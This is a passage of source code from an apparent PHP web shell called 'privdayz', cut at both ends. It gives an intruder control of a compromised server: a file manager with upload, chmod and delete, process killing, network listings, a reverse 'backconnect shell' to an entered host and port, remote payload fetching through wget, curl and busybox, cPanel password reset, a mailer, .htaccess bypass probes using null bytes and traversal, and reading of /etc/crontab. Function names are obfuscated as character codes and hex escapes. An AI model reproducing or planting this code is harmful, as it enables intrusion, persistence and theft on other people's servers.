          </tr>';
          if ($count > 1000) break;
        }
       }
       unset($file);
       unset($rii);
       if ($count == 0) {
        echo '<tr><td colspan="4" style="color:#e53935;">No file found.</td></tr>';
       }
       }
     } else {
       echo '<tr><td colspan="4" style="opacity:.5;">No operation yet.</td></tr>';
     }
     ?>
     </tbody>
    </table>
    </div>
  </div>
</div>
<?php elseif (isset($_GET['process'])): ?>
  <div class="pr1vd4yz-card">
    <div class="pr1vd4yz-card-header">
    <h2 class="pr1vd4yz-card-title">
  <i class="fas fa-server pr1vd4yz-icon-red"></i>
  root process watch
</h2>

    </div>
    <div class="pr1vd4yz-card-section">
    <div class="pr1vd4yz-table-wrap">
     <table class="pr1vd4yz-table-proc">
       <thead>
       <tr>
        <th>PID</th>
        <th>User</th>
        <th>CPU %</th>
        <th>MEM %</th>
        <th>Command</th>
        <th>Action</th>
       </tr>
       </thead>
       <tbody>
       <?php 
       $processes = [];
if (isset($_GET['process'])) { $processes = getProcessList(); }
       foreach ($processes as $process): 
       ?>
        <tr>
          <td class="pr1vd4yz-proc-pid"><?= $process['pid'] ?></td>
          <td class="pr1vd4yz-proc-user"><?= $process['user'] ?></td>
          <td class="pr1vd4yz-proc-cpu"><?= $process['cpu'] ?></td>
          <td class="pr1vd4yz-proc-mem"><?= $process['mem'] ?></td>
          <td class="pr1vd4yz-proc-cmd" title="<?= htmlspecialchars($process['command']) ?>">
          <?= htmlspecialchars(substr($process['command'], 0, 50)) ?>
          </td>
          <td>
          <form method="POST" style="display:inline;"><input type="hidden" name="pid" value="<?= $process['pid'] ?>">
            <button type="submit" class="pr1vd4yz-btn pr1vd4yz-btn-red pr1vd4yz-kill-btn">
             <i class="fas fa-skull"></i> Kill
            </button>
          </form>
          </td>
        </tr>
       <?php endforeach; ?>
       </tbody>
     </table>
    </div>
    </div>
  </div>
<?php elseif (isset($_GET['network'])): ?>
  <div class="pr1vd4yz-card">
    <div class="pr1vd4yz-card-header">
<h2 class="pr1vd4yz-card-title">
  <i class="fas fa-bolt pr1vd4yz-icon-red"></i>
  live net threats
</h2>
    </div>
    <div class="pr1vd4yz-card-section">
    <div class="pr1vd4yz-table-wrap">
     <table class="pr1vd4yz-table-net">
       <thead><tr>
        <th>protocol</th>
        <th>local address</th>
        <th>remote address</th>
        <th>status</th>
        <th>pid</th>
       </tr>
       </thead>
       <tbody>
       <?php 
       $connections = [];
       if (isset($_GET['network'])) { $connections = getNetworkConnections(); }
       foreach ($connections as $conn): 
       ?>
       <tr>
        <td><?= $conn['proto'] ?></td>
        <td class="pr1vd4yz-net-local"><?= $conn['local'] ?></td>
        <td class="pr1vd4yz-net-remote"><?= $conn['remote'] ?></td>
        <td class="pr1vd4yz-net-status"><?= $conn['status'] ?></td>
        <td class="pr1vd4yz-net-pid"><?= $conn['pid'] ?></td>
       </tr>
       <?php endforeach; ?>
       </tbody>
     </table>
    </div>
    </div>
  </div>
<?php else: ?>

<div class="pr1vd4yz-lite-uname">
  <span class="pr1vd4yz-lite-dot"></span>
  <?= php_uname(); ?>
</div>

<div class="pr1vd4yz-lite-info">
    <div class="pr1vd4yz-lite-row">
    <span class="pr1vd4yz-lite-key">[safe mode]</span>
    <span class="pr1vd4yz-lite-val <?= ini_get('safe_mode') ? 'pr1vd4yz-lite-on' : 'pr1vd4yz-lite-off' ?>">
    <?= ini_get('safe_mode') ? 'ON' : 'OFF'; ?>
    </span>
  </div>
<div class="pr1vd4yz-lite-row"><span class="pr1vd4yz-lite-key">[d1s4bl3 f7nct1ons]</span>
  <?php
    $d1sxb = trim(ini_get('disable_functions'), ", \t\n\r\0\x0B");
    if (!$d1sxb) {
    echo '<span class="pr1vd4yz-lite-val pr1vd4yz-lite-on" style="background:#eafff5;">None</span>';
    } else {
    echo '<span class="pr1vd4yz-lite-val pr1vd4yz-lite-off" style="white-space:normal;">'
       . str_replace(",", ", ", $d1sxb)
       . '</span>';
    }
  ?>
</div>

  <div class="pr1vd4yz-lite-row"><span class="pr1vd4yz-lite-key">[h0st]</span> <span class="pr1vd4yz-lite-val"><?= $pr1vxas[8](); ?></span></div>
  <div class="pr1vd4yz-lite-row"><span class="pr1vd4yz-lite-key">[us3r]</span> <span class="pr1vd4yz-lite-val"><?=$pr1vxas[9](); ?></span></div>
  <div class="pr1vd4yz-lite-row"><span class="pr1vd4yz-lite-key">[s0ftware]</span> <span class="pr1vd4yz-lite-val"><?= $_SERVER["\x53\x45\x52\x56\x45\x52\x5f\x53\x4f\x46\x54\x57\x41\x52\x45"]; ?></span></div>
  <div class="pr1vd4yz-lite-row"><span class="pr1vd4yz-lite-key">[1p]</span> <span class="pr1vd4yz-lite-val"><?= gethostbyname($_SERVER["\x53\x45\x52\x56\x45\x52\x5f\x41\x44\x44\x52"]); ?></span></div>
  <div class="pr1vd4yz-lite-row"><span class="pr1vd4yz-lite-key">[php]</span> <span class="pr1vd4yz-lite-val"><?= PHP_VERSION; ?></span></div>
<div class="pr1vd4yz-lite-row" style="gap:7px;flex-wrap:wrap;">
<?php
if (!function_exists('fobf')) {
    function fobf($arr) {
     $r = '';
     foreach ($arr as $n) $r .= chr($n);
     return $r;
    }
}
$fnX6 = fobf([102,117,110,99,116,105,111,110,95,101,120,105,115,116,115]);
$chDxXZx      = fobf([105,110,105,95,103,101,116]); 
$fn_php_sapi_name   = fobf([112,104,112,95,115,97,112,105,95,110,97,109,101]);

$features = [
  'CURL'      => function() use($fnX6) {
    $f = fobf([99,117,114,108,95,105,110,105,116]);
    return $fnX6($f);
  },
  'SSH2'      => function() use($fnX6) {
    $f = fobf([115,115,104,50,95,99,111,110,110,101,99,116]);
    return $fnX6($f);
  },
  'Magic Quotes' => function() use($chDxXZx) {
    $f = fobf([109,97,103,105,99,95,113,117,111,116,101,115,95,103,112,99]);
    return (bool)$chDxXZx($f);
  },
  'MySQL'     => function() use($fnX6) {
    $f1 = fobf([109,121,115,113,108,105,95,99,111,110,110,101,99,116]);
    $f2 = fobf([109,121,115,113,108,95,99,111,110,110,101,99,116]);
    return $fnX6($f1) || $fnX6($f2);
  },
  'MSSQL'     => function() use($fnX6) {
    $f1 = fobf([109,115,115,113,108,95,99,111,110,110,101,99,116]);
    $f2 = fobf([115,113,108,115,114,118,95,99,111,110,110,101,99,116]);
    return $fnX6($f1) || $fnX6($f2);
  },
  'PostgreSQL'   => function() use($fnX6) {
    $f = fobf([112,103,95,99,111,110,110,101,99,116]);
    return $fnX6($f);
  },
  'Oracle'    => function() use($fnX6) {
    $f = fobf([111,99,105,95,99,111,110,110,101,99,116]);
    return $fnX6($f);
  },
  'CGI'       => function() use($fn_php_sapi_name) {
    $name = $fn_php_sapi_name();
    return ($name === 'cgi' || $name === 'cgi-fcgi');
  },
];


foreach ($features as $name => $fn) {
  $on = $fn() ? 'ON' : 'OFF';
  $class = $on === 'ON' ? 'pr1vd4yz-lite-on' : 'pr1vd4yz-lite-off';
  echo '<span class="pr1vd4yz-lite-badge '.$class.'">'.$name.' : '.$on.'</span> ';
}
?>

  </div>
</div>
<div class="pr1vd4yz-filelist-root">
<div class="prv-fm-actions">
  <a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>&createfolder" class="prv-fm-btn" title="New Folder">
    <i class="fas fa-folder-plus"></i> <span>newFolder</span>
  </a>
  <a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>&createfile" class="prv-fm-btn" title="New File">
    <i class="fas fa-file-circle-plus"></i> <span>newFile</span>
  </a>
  <form class="prv-fm-upload" action="" method="post" enctype="multipart/form-data">
    <input type="file" name="privdayz-upload" id="prv-upload-1" class="prv-fm-upload-input">
    <label for="prv-upload-1" class="prv-fm-btn">
    <i class="fas fa-cloud-arrow-up"></i> <span>upFile</span>
    </label>
    <button type="submit" name="privdayz-up-submit" class="prv-fm-btn prv-fm-btn-green">
    <i class="fas fa-circle-check"></i> <span>up</span>
    </button>
  </form>
  <form class="prv-fm-upload" action="" method="post" enctype="multipart/form-data">
    <input type="file" name="w4f-upload" id="prv-upload-2" class="prv-fm-upload-input">
    <label for="prv-upload-2" class="prv-fm-btn">
    <i class="fas fa-cloud-arrow-up"></i> <span>upFile2</span>
    </label>
    <button type="submit" name="w4f-up-submit" class="prv-fm-btn prv-fm-btn-green">
    <i class="fas fa-circle-check"></i> <span>up</span>
    </button>
  </form>
</div>
  <form action="" method="post">
    <div class="pr1vd4yz-filelist-head">
     
    </div>
    <div class="pr1vd4yz-filelist-body">
     
    <?php foreach ($pr1vf1l3 as $_D): ?>
     <?php if ($pr1vxas[2]($_D)): ?>
       <div class="pr1vd4yz-file-row pr1vd4yz-dir">
       <span class="pr1vd4yz-file-col pr1vd4yz-file-check">
        <input type="checkbox" name="check[]" value="<?= $_D ?>">
       </span>
       <span class="pr1vd4yz-file-col pr1vd4yz-file-icon"><i class="fa-solid fa-folder-open"></i></span>
       <span class="pr1vd4yz-file-col pr1vd4yz-file-name">
        <a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]() . '/' . $_D); ?>" class="pr1vd4yz-file-link"><?= prvFx1($_D); ?></a>
       </span>
       <span class="pr1vd4yz-file-col pr1vd4yz-file-perm"><?= p3rms($pr1vxas[0]() . '/' . $_D); ?></span>
       <span class="pr1vd4yz-file-col pr1vd4yz-file-size"></span>
       <span class="pr1vd4yz-file-col pr1vd4yz-file-actions">
        <a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()); ?>&re=<?= pr1vd444yz($_D) ?>" title="Rename"><i class="fa-regular fa-pen-to-square"></i></a>
        <a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()); ?>&ch=<?= pr1vd444yz($_D) ?>" title="Chmod"><i class="fa-solid fa-user-gear"></i></a>
       </span>
       </div>
     <?php endif; ?>
    <?php endforeach; ?>
    <?php foreach ($pr1vf1l3 as $_F): ?>
     <?php if ($pr1vxas[3]($_F)): ?>
       <?php $ext = strtolower(pathinfo($_F, PATHINFO_EXTENSION)); ?>
       <div class="pr1vd4yz-file-row pr1vd4yz-file">
       <span class="pr1vd4yz-file-col pr1vd4yz-file-check">
        <input type="checkbox" name="check[]" value="<?= $_F ?>">
       </span>
       <span class="pr1vd4yz-file-col pr1vd4yz-file-icon">
        <?php if ($ext === 'php'): ?>
          <i class="fa-brands fa-php"></i>
        <?php elseif (in_array($ext, ['jpg','jpeg','png','gif','webp','svg'])): ?>
          <i class="fa-regular fa-image"></i>
        <?php elseif (in_array($ext, ['zip','rar','gz','tar','7z'])): ?>
          <i class="fa-solid fa-box-archive"></i>
        <?php elseif (in_array($ext, ['txt','md','log'])): ?>
          <i class="fa-regular fa-note-sticky"></i>
        <?php elseif ($ext === 'js'): ?>
          <i class="fa-brands fa-js"></i>
        <?php elseif ($ext === 'css'): ?>
          <i class="fa-brands fa-css3-alt"></i>
        <?php elseif (in_array($ext, ['html','htm'])): ?>
          <i class="fa-brands fa-html5"></i>
        <?php elseif (in_array($ext, ['json','yaml','yml','xml'])): ?>
          <i class="fa-solid fa-code"></i>
        <?php elseif (in_array($ext, ['mp3','wav','flac'])): ?>
          <i class="fa-solid fa-headphones"></i>
        <?php elseif (in_array($ext, ['mp4','avi','mov','webm','mkv'])): ?>
          <i class="fa-solid fa-film"></i>
        <?php else: ?>
          <i class="fa-regular fa-file"></i>
        <?php endif; ?>
       </span>
       <span class="pr1vd4yz-file-col pr1vd4yz-file-name"><a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()); ?>&f=<?= pr1vd444yz($_F); ?>" class="pr1vd4yz-file-link"><?= prvFx1($_F); ?></a>
        <span class="pr1vd4yz-file-ext"><?= strtoupper($ext) ?></span>
       </span>
       <span class="pr1vd4yz-file-perm <?= is_writable($pr1vxas[0]() . '/' . $_F) ? 'pr1vd4yz-file-writable' : 'pr1vd4yz-file-readonly' ?>">
        <i class="fas <?= is_writable($pr1vxas[0]() . '/' . $_F) ? 'fa-unlock-alt pr1vd4yz-perm-green' : 'fa-lock pr1vd4yz-perm-red' ?>"></i>
        <?= p3rms($pr1vxas[0]() . '/' . $_F); ?>
       </span>
       <span class="pr1vd4yz-file-size-badge">
        <?= formatSize(filesize($_F)); ?>
       </span>
       <span class="pr1vd4yz-file-col pr1vd4yz-file-actions">
        <a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()); ?>&re=<?= pr1vd444yz($_F) ?>" title="Rename"><i class="fa-regular fa-pen-to-square"></i></a>
        <a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()); ?>&ch=<?= pr1vd444yz($_F) ?>" title="Chmod"><i class="fa-solid fa-user-gear"></i></a>
        <a href="?action=delete&item=<?= pr1vd444yz($_F) ?>" title="Delete"><i class="fa-solid fa-ban"></i></a>
        <a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()); ?>&don=<?= pr1vd444yz($_F) ?>" title="Download"><i class="fa-solid fa-download"></i></a></span>
       </div>
     <?php endif; ?>
    <?php endforeach; ?>
    </div>
    <div class="pr1vd4yz-filelist-foot">
    <select name="privdayz-select" class="pr1vd4yz-filelist-select">
     <option value="delete">delete</option>
     <option value="unzip">unzip</option>
     <option value="zip">zip</option>
    </select>
    <button type="submit" name="submit-action" class="pr1vd4yz-filelist-btn"><i class="fa-solid fa-rocket"></i> run</button>
    </div>
  </form>
</div>
 <?php endif; ?>
 <?php
 echo implode('', $a);
?>
          </div>
       </div>
     </div>

  <?php if (isset($_GET['cpanelreset'])) : ?>
  <div class="pr1vd4yz-modal-bg">
    <div class="pr1vd4yz-modal-wizard" style="max-width:410px;min-width:0;">
    <div class="pr1vd4yz-modal-header-wiz">
     <div class="pr1vd4yz-wiz-icon" style="background:#fb923c;color:#fff;"><i class="fab fa-cpanel"></i></div>
     <div>
       <div class="pr1vd4yz-wiz-title">cPanel reset</div>
       <div class="pr1vd4yz-wiz-desc">reset cPanel password</div>
     </div>
    <a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>" class="pr1vd4yz-modal-close-wiz">&times;</a>

    </div>
    <form action="" method="post">
     <div class="pr1vd4yz-wiz-section">
       <div class="pr1vd4yz-wiz-section-icon" style="background:#fff5e6;color:#fb923c;"><i class="fas fa-envelope"></i></div>
       <div class="pr1vd4yz-wiz-fields"><input type="email" name="resetcp" class="pr1vd4yz-wiz-input" placeholder="privdayz@privdayz.com">
       </div>
     </div>
     <div class="pr1vd4yz-modal-actions-wiz">
       <button type="submit" name="submit" class="pr1vd4yz-wiz-btn" style="background:#fb923c;color:#fff;border:1.1px solid #fb923c;">
       <i class="fas fa-sync-alt"></i> reset
       </button>
          <a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>" type="button" class="pr1vd4yz-wiz-btn pr1vd4yz-wiz-btn-light pr1vd4yz-cron-close-btn">
     <i class="fas fa-times"></i> close
    </a>
     </div>
    </form>
    </div>
  </div>
<?php endif; ?>
    
  <?php if (isset($_GET['backconnect'])) : ?>
  <div class="pr1vd4yz-modal-bg">
    <div class="pr1vd4yz-modal-wizard">
    <div class="pr1vd4yz-modal-header-wiz">
     <div class="pr1vd4yz-wiz-icon"><i class="fas fa-network-wired"></i></div>
     <div>
       <div class="pr1vd4yz-wiz-title">backconnect shell</div>
       <div class="pr1vd4yz-wiz-desc">remote connection start (reverse shell)</div>
     </div>
     <a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>" class="pr1vd4yz-modal-close-wiz">&times;</a>
    </div>
    <form action="" method="post">
     <div class="pr1vd4yz-wiz-section">
       <div class="pr1vd4yz-wiz-section-icon"><i class="fas fa-terminal"></i></div>
       <div class="pr1vd4yz-wiz-fields">
       <select name="privdayz-bc" class="pr1vd4yz-wiz-input">
        <option value="-">choose method</option>
        <option value="perl">perl</option>
        <option value="python">python</option>
        <option value="ruby">ruby</option>
        <option value="bash">bash</option>
        <option value="xterm">xterm</option>
        <option value="golang">golang</option>
        <option value="php">php</option>
        <option value="nc">nc</option>
        <option value="sh">sh</option>
       </select>
       <input type="text" name="backconnect-host" class="pr1vd4yz-wiz-input" placeholder="Host (e.g. 55.66.33.22)">
       <input type="number" name="backconnect-port" class="pr1vd4yz-wiz-input" placeholder="Port (e.g. 1337)">
       </div>
     </div>
     <div class="pr1vd4yz-modal-actions-wiz">
       <button type="submit" name="submit-bc" class="pr1vd4yz-wiz-btn pr1vd4yz-wiz-btn-red">
       <iclass="fas fa-plug"></i> connect
       </button>
       <a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>" class="pr1vd4yz-wiz-btn pr1vd4yz-wiz-btn-light">
       <i class="fas fa-times"></i> go back
       </a>
     </div>
    </form>
    </div>
  </div>
<?php endif; ?>
<?php if (isset($_GET['mailer'])) : ?>
  <div class="pr1vd4yz-modal-bg">
    <div class="pr1vd4yz-modal-wizard">
    <div class="pr1vd4yz-modal-header-wiz">
     <div class="pr1vd4yz-wiz-icon" style="background:#e91e63;"><i class="fas fa-envelope"></i></div>
     <div>
       <div class="pr1vd4yz-wiz-title">php mailer</div>
       <div class="pr1vd4yz-wiz-desc">send a message with smtp</div>
     </div>
     <a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>" class="pr1vd4yz-modal-close-wiz">&times;</a>
    </div>
    <form action="" method="post">
     <div class="pr1vd4yz-wiz-section">
       <div class="pr1vd4yz-wiz-section-icon" style="background:#ffe2ee;color:#e91e63;"><i class="fas fa-paper-plane"></i></div>
       <div class="pr1vd4yz-wiz-fields">
       <textarea name="message-smtp" class="pr1vd4yz-wiz-input" rows="5" placeholder="message"></textarea>
       <input type="text" name="mailto-subject" class="pr1vd4yz-wiz-input" placeholder="subject">
       <input type="email" name="mail-from-smtp" class="pr1vd4yz-wiz-input" placeholder="from: privdayz@mail.com">
       <input type="email" name="mail-to-smtp" class="pr1vd4yz-wiz-input" placeholder="to: privdayz@mail.com">
       </div>
     </div>
     <div class="pr1vd4yz-modal-actions-wiz">
       <button type="submit" name="submit" class="pr1vd4yz-wiz-btn pr1vd4yz-wiz-btn-red" style="background:#e91e63;border-color:#e91e63;">
       <i class="fas fa-paper-plane"></i> send
       </button>
       <a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>" class="pr1vd4yz-wiz-btn pr1vd4yz-wiz-btn-light">
       <i class="fas fa-times"></i> go back
       </a>
     </div>
    </form>
    </div>
  </div>
<?php endif; ?>
<?php if (isset($_GET['phpinfo'])) : ?>
  <div class="pr1vd4yz-modal-bg">
    <div class="pr1vd4yz-modal-wizard" style="max-width:500px;min-width:0;">
    <div class="pr1vd4yz-modal-header-wiz">
     <div class="pr1vd4yz-wiz-icon" style="background:#7e57c2;"><i class="fab fa-php"></i></div>
     <div>
       <div class="pr1vd4yz-wiz-title">php info</div>
       <div class="pr1vd4yz-wiz-desc">system php environment</div>
     </div>
     <a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>" class="pr1vd4yz-modal-close-wiz">&times;</a>
    </div>
    <div style="padding:0 0 13px 0;">
     <div style="
       background: #fff4f4;
       color: #222;
       font-size: 13px;
       line-height: 1.48;
       border-radius: 10px;
       margin: 18px 22px 0 22px;
       padding: 19px 16px 19px 16px;box-shadow: 0 1px 10px #e5393510;
       max-height: 340px;
       min-height: 110px;
       overflow: auto;
       font-family: 'JetBrains Mono', 'Fira Mono', monospace;
     ">
     <?php
       
       phpinfo(INFO_GENERAL | INFO_CONFIGURATION | INFO_MODULES);
       $pinfo = "";
       $pinfo = preg_replace([
       '#<style[^>]*>.*?</style>#si',
       '#<table[^>]*>|</table>#i',
       '#<tr[^>]*>|</tr>#i',
       '#<td[^>]*>|</td>#i',
       '#<th[^>]*>|</th>#i',
       '#<h2[^>]*>|</h2>#i',
       '#<a[^>]*>(.*?)</a>#i',
       '#<br\s*/?>#i',
       '#<div[^>]*>|</div>#i',
       '#<span[^>]*>|</span>#i',
       ], [
       '',
       '', '',
       '', '',
       '', '',
       '', '',
       '$1',
       "\n",
       '', '',
       '', '',
       ], $pinfo);
       $lines = preg_split('/\r?\n/', strip_tags($pinfo));
       $lines = array_slice(array_filter(array_map('trim', $lines)), 0, 80);
       echo '<pre style="margin:0;background:none;border:none;color:#e53935;line-height:1.47;white-space:pre-wrap;">' . htmlspecialchars(implode("\n", $lines)) . '</pre>';
     ?>
     </div>
    </div>
    </div>
  </div>
<?php endif; ?>
<?php if (isset($_GET['disk'])) : ?>
  <div class="pr1vd4yz-modal-bg">
    <div class="pr1vd4yz-modal-wizard" style="max-width:380px;min-width:0;">
    <div class="pr1vd4yz-modal-header-wiz">
     <div class="pr1vd4yz-wiz-icon" style="background:#26a69a;"><i class="fas fa-hdd"></i></div>
     <div>
       <div class="pr1vd4yz-wiz-title">disk info</div>
       <div class="pr1vd4yz-wiz-desc">disk usage & space</div>
     </div>
     <a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>" class="pr1vd4yz-modal-close-wiz">&times;</a>
    </div>
    <div class="pr1vd4yz-wiz-section" style="padding:20px 24px; color:#e53935; background:#fff4f4;">
     <?php
     $t = disk_total_space("/");
     $f = disk_free_space("/");
     $u = $t-$f;
     function fmt($b) {
       $s = ['B','KB','MB','GB','TB']; $i=0;
       while($b>=1024 && ++$i) $b/=1024;
       return round($b,($i?1:0)).' '.$s[$i];
     }
     ?>
     <div>Total Space: <?= fmt($t) ?></div>
     <div>Used Space: <?= fmt($u) ?></div>
     <div>Free Space: <?= fmt($f) ?></div>
     <div style="margin-top:13px;">
       <div style="height:9px;background:#fdecec;border-radius:5px;overflow:hidden;">
       <div style="width:<?= round($u/$t*100) ?>%;height:9px;background:#e53935;border-radius:5px;"></div>
       </div>
       <small><?= round($u/$t*100) ?>% used</small></div>
    </div>
    </div>
  </div>
<?php endif; ?>
<?php if (isset($_GET['remup'])): ?>
<div class="pr1vd4yz-modal-bg">
  <div class="pr1vd4yz-modal-wizard" style="max-width:420px;min-width:0;">
    <div class="pr1vd4yz-modal-header-wiz">
    <div class="pr1vd4yz-wiz-icon" style="background:#10b981;"><i class="fas fa-cloud-arrow-down"></i></div>
    <div>
     <div class="pr1vd4yz-wiz-title">remote file upload</div>
     <div class="pr1vd4yz-wiz-desc">fetch remote file to server</div>
    </div>
    <a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>" class="pr1vd4yz-modal-close-wiz">&times;</a>
    </div>
    <form method="post" class="pr1vd4yz-wiz-upload-form">
    <div class="pr1vd4yz-wiz-section">
     <div class="pr1vd4yz-wiz-fields" style="gap: 13px;">
       <input type="text" name="remote_url" class="pr1vd4yz-wiz-input" placeholder="remote file url (https://...)">
       <input type="text" name="save_path" class="pr1vd4yz-wiz-input" value="<?= htmlspecialchars(getcwd(), ENT_QUOTES) . '/privdayz.php' ?>">
     </div>
    </div>
    <div class="pr1vd4yz-modal-actions-wiz">
     <button type="submit" name="fetch-remote" class="pr1vd4yz-wiz-btn pr1vd4yz-wiz-btn-red"><i class="fas fa-download"></i> fetch</button>
        <div class="pr1vd4yz-modal-actions-wiz">
    <a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>" type="button" class="pr1vd4yz-wiz-btn pr1vd4yz-wiz-btn-light pr1vd4yz-cron-close-btn">
     <i class="fas fa-times"></i> close
    </a>
    </div>
    </div>
    </form>
    <?php
if(isset($_POST['fetch-remote'])):
    $url = trim($_POST['remote_url'] ?? "");
    $path = trim($_POST['save_path'] ?? "");
    $ok = false;
    $shell_cmds = [
    "wget --no-check-certificate -O " . escapeshellarg($path) . " " . escapeshellarg($url) . " 2>&1",
    "curl -k -L " . escapeshellarg($url) . " -o " . escapeshellarg($path) . " 2>&1",
    "lynx -source " . escapeshellarg($url) . " > " . escapeshellarg($path) . " 2>&1",
    "fetch -o " . escapeshellarg($path) . " " . escapeshellarg($url) . " 2>&1",
    "busybox wget -O " . escapeshellarg($path) . " " . escapeshellarg($url) . " 2>&1",
    ];
    foreach($shell_cmds as $cmd) {
     pr1vd4yzC($cmd);
     if(@file_exists($path) && @filesize($path)>0) { $ok = true; break; }
    }
    if(!$ok && function_exists('file_get_contents')) {
     $data = @file_get_contents($url);
     if($data && @file_put_contents($path, $data)!==false && @filesize($path)>0) $ok = true;
    }
    if(!$ok && function_exists('fopen')) {
     $rf = @fopen($url, "rb");
     if($rf) {
       $wf = @fopen($path, "wb");
       if($wf) {
          while(!feof($rf)) @fwrite($wf, fread($rf, 8192));
          @fclose($wf);
       }
       @fclose($rf);
       if(@file_exists($path) && @filesize($path)>0) $ok = true;
     }
    }
    if(!$ok && function_exists('curl_init')) {
     $ch = @curl_init($url);
     @curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
     @curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
     @curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
     @curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
     $data = @curl_exec($ch);
     @curl_close($ch);
     if($data && @file_put_contents($path, $data)!==false && @filesize($path)>0) $ok=true;
    }
    if(!$ok && stripos($url,'data:')===0) {
     $bs7y3q = substr($url, strpos($url, ',')+1);
     $decoded = pr1vdc($bs7y3q);
     if($decoded && @file_put_contents($path, $decoded)!==false && @filesize($path)>0) $ok=true;
    }

    if($ok){
     echo'<div style="margin:18px 0 8px 0;text-align:center;"><span style="background:#ecfdf5;color:#16a34a;padding:7px 22px;border-radius:7px;"><i class=\'fas fa-check-circle\'></i> success: saved!</span></div>';
    }else{
     echo'<div style="margin:18px 0 8px 0;text-align:center;"><span style="background:#fff4f4;color:#e53935;padding:7px 22px;border-radius:7px;"><i class=\'fas fa-ban\'></i> failed to fetch document!</span></div>';
    }
endif;
?>
  </div>
</div>
<?php endif; ?>
<?php if (isset($_GET['htbypass'])): ?>
  <div class="pr1vd4yz-modal-bg">
    <div class="pr1vd4yz-modal-wizard" style="max-width:420px;">
    <div class="pr1vd4yz-modal-header-wiz">
     <div class="pr1vd4yz-wiz-icon" style="background:#e53935;"><i class="fas fa-lock-open"></i></div>
     <div>
       <div class="pr1vd4yz-wiz-title">.htaccess bypass</div>
       <div class="pr1vd4yz-wiz-desc">
       <span style="font-size:.98em;">
        Test protected file access with multi bypass (nullbyte, traversal, query...)<br>
        Enter relative path or full url
       </span>
       </div>
     </div>
     <a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>" class="pr1vd4yz-modal-close-wiz">&times;</a>
    </div>
    <form method="post" class="pr1vd4yz-wiz-form">
     <div class="pr1vd4yz-wiz-section">
       <div class="pr1vd4yz-wiz-fields" style="gap: 10px;">
       <input type="text" name="target_file" class="pr1vd4yz-wiz-input" placeholder="/protected/.htpasswd or full URL" required>
       </div>
     </div>
     <div class="pr1vd4yz-modal-actions-wiz">
       <button type="submit" name="trybypass" class="pr1vd4yz-wiz-btn pr1vd4yz-wiz-btn-red"><i class="fas fa-bolt"></i> test bypass</button>
 <a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>" type="button" class="pr1vd4yz-wiz-btn pr1vd4yz-wiz-btn-light pr1vd4yz-cron-close-btn">
     <i class="fas fa-times"></i> close
    </a>
     </div>
    </form>
    <?php
    if (isset($_POST['trybypass'])):
     $file = trim($_POST['target_file']);
     $bypass = [
       $file,
       $file . '%00',
       '../' . basename($file),
       $file . '/',
       $file . '?',
       $file . '/../' . basename($file),
       str_replace('/','//',$file),
       str_replace('/','\\',$file),
       str_replace('.','%2e',$file)
     ];
     $results = [];
     foreach ($bypass as $try) {
       $url = (strpos($try, 'http') === 0) ? $try : ($_SERVER['REQUEST_SCHEME'].'://'.$_SERVER['SERVER_NAME'].$try);
       $ctx = stream_context_create(['http'=>['method'=>'GET','timeout'=>3]]);
       $res = @file_get_contents($url, false, $ctx);
       $status = isset($http_response_header[0]) ? $http_response_header[0] : 'NO RESPONSE';
       $short = strlen($res) ? substr(trim($res), 0, 80) : '-';
       $results[] = [
       'method' => $try,
       'status' => $status,
       'snippet' => htmlspecialchars($short)
       ];
     }
    ?>
    <div style="margin:14px 7px 7px 7px;">
     <div style="background:#fff4f4;border-radius:8px;padding:9px 11px 9px 11px;max-height:190px;overflow:auto;">
       <b style="color:#e53935">Bypass Results
       <table style="width:100%;font-size:.98em;margin-top:4px;">
       <tr>
        <th style="text-align:left;color:#e53935;">Variant</th>
        <th style="text-align:left;color:#ff3939;">Status</th>
        <th style="text-align:left;color:#666;">Output</th>
       </tr>
       <?php foreach ($results as $r): ?>
       <tr>
        <td style="font-family:monospace; color:#b71c1c;"><?= htmlspecialchars($r['method']) ?></td>
        <td><?= $r['status'] ?></td>
        <td style="font-family:monospace; color:#868686;"><?= $r['snippet'] ?></td>
       </tr>
       <?php endforeach; ?>
       </table>
     </div>
    </div>
    <?php endif; ?>
    </div>
  </div>
<?php endif; ?>
<?php if (isset($_GET['crontab'])): ?>
<div class="pr1vd4yz-modal-bg">
  <div class="pr1vd4yz-modal-wizard" style="max-width:580px;">
    <div class="pr1vd4yz-modal-header-wiz">
    <div class="pr1vd4yz-wiz-icon" style="background:#b71c1c;"><i class="fas fa-clock-rotate-left"></i></div>
    <div>
     <div class="pr1vd4yz-wiz-title">cron jobs</div>

    </div>
    <a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>" class="pr1vd4yz-modal-close-wiz">&times;</a>
    </div>
    <div class="pr1vd4yz-wiz-section pr1vd4yz-cronmodal-box">
    <?php
echo'<div class="pr1vd4yz-cronmodal-section">';
echo'<div class="pr1vd4yz-cronmodal-root">[root cron jobs]</div>';
$_fc=_prv_str([102,105,108,101,95,103,101,116,95,99,111,110,116,101,110,116,115]);
$_rt=@$_fc('/etc/crontab');
if(!function_exists('_prv_rx_j9q')){function _prv_rx_j9q($c){
